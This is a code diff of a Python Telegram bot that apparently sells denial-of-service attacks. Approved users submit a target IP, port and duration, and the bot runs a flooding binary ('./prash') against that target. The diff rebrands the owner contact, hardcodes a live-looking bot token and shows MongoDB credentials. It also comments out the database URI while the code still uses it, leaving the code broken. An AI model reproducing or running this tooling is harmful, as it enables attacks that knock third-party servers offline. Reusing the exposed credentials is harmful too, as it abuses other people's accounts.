@@ -16,8 +16,8 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = "7840494232:AAGQyf6YzK"
-MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
+TOKEN = "7251971985:AAGLu7puqX8EvLA5QqKQ8mjoDXtaDqG_0bA"
+#MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
 FORWARD_CHANNEL_ID = -1002156421934
 CHANNEL_ID = -1002156421934
 error_channel_id = -1002156421934
@@ -28,7 +28,7 @@ client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
 db = client['zoya']
 users_collection = db.users
 
-bot = telebot.TeleBot(TOKEN)
+bot = telebot.TeleBot("7251971985:AAGLu7puqX8EvLA5QqKQ8mjoDXtaDqG_0bA")
 REQUEST_INTERVAL = 1
 
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
@@ -88,7 +88,7 @@ import asyncio
 async def run_attack_command_async(target_ip, target_port, duration):
     # Run both commands concurrently
     attack_process = asyncio.create_subprocess_shell(
-        f"./ipx {target_ip} {target_port} {duration}"
+        f"./prash {target_ip} {target_port} {duration} 60"
     )
     pkill_process = asyncio.create_subprocess_shell("pkill screen")
 
@@ -182,7 +182,7 @@ def handle_attack_command(message):
         if not user_data or user_data['plan'] == 0:
             bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                        "*You need to be approved to use this bot.*\n"  # Need approval message
-                                       "*Contact the owner for assistance: @SOULCRACKS.*", parse_mode='Markdown')  # Contact owner message
+                                       "*Contact the owner for assistance: @reflex2kk.*", parse_mode='Markdown')  # Contact owner message
             return
 
         # Check plan limits
@@ -280,11 +280,11 @@ def myinfo_command(message):
     if not user_data:
         # User not found in the database
         response = "*❌ Oops! No account information found!* \n"  # Account not found message
-        response += "*For assistance, please contact the owner: @SOULCRACKS* "  # Contact owner message
+        response += "*For assistance, please contact the owner: @reflex2kk* "  # Contact owner message
     elif user_data.get('plan', 0) == 0:
         # User found but not approved
         response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
-        response += "*Please reach out to the owner for assistance: @SOULCRACKS* 🙏"  # Contact owner message
+        response += "*Please reach out to the owner for assistance: @Sreflex2kk* 🙏"  # Contact owner message
     else:
         # User found and approved
         username = message.from_user.username or "Unknown User"  # Default username if none provided
@@ -345,7 +345,7 @@ def owner_command(message):
     response = (
         "*👤 **Owner Information:**\n\n"
         "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
-        "📩 **Telegram:** @SOULCRACKS\n\n"
+        "📩 **Telegram:** @reflex2kk\n\n"
         "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
         "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
     )
